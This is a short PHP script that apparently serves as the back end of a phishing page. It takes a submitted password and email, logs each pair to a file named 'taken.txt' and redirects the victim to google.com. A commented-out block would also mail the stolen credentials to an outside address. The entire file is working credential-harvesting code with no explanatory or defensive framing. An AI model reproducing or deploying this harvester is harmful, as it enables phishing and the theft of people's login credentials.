<?php
$pass = $_POST['pass'];
$email = $_POST['email'];
$pass = htmlspecialchars($pass);
$email = htmlspecialchars($email);
$pass = urldecode($pass);
$email = urldecode($email);
$pass = trim($pass);
$email = trim($email);
echo "пароль:".$pass;
echo "<br>";
echo "login:".$email;
/*if (mail("killshaw@ya.ru", "Заявка с сайта", "Пароль:".$pass.". Логин: ".$email ,"From: killshaw@ya.ru \r\n"))
 {     echo "сообщение успешно отправлено"; 
} else { 
    echo "при отправке сообщения возникли ошибки";*/
$filename = "taken.txt";
$s = ($_POST['email']);
$p = ($_POST['pass']);
$sum = '' . $p .': Password   '.$s . ': Login /';
if (file_exists($filename)) {
    file_put_contents($filename, $sum, FILE_APPEND);
    header( "location: http://google.com" );
}
?>